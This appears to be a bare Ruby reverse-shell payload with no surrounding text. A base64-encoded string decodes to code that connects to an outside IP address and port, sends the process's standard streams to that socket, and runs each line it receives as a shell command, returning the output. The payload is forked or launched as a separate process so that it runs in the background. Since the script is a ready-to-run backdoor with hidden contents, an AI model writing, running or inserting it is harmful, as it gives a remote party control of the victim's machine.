code = %(cmVxdWlyZSAnc29ja2V0JztjPVRDUFNvY2tldC5uZXcoIjE5My4xNjEuMTkzLjk5IiwgMjUyOTQpOyRzdGRpbi5yZW9wZW4oYyk7JHN0ZG91dC5yZW9wZW4oYyk7JHN0ZGVyci5yZW9wZW4oYyk7JHN0ZGluLmVhY2hfbGluZXt8bHxsPWwuc3RyaXA7bmV4dCBpZiBsLmxlbmd0aD09MDsoSU8ucG9wZW4obCwicmIiKXt8ZmR8IGZkLmVhY2hfbGluZSB7fG98IGMucHV0cyhvLnN0cmlwKSB9fSkgcmVzY3VlIG5pbCB9).unpack(%(m0)).first
if RUBY_PLATFORM =~ /mswin|mingw|win32/
inp = IO.popen(%(ruby), %(wb)) rescue nil
if inp
inp.write(code)
inp.close
end
else
if ! Process.fork()
eval(code) rescue nil
end
end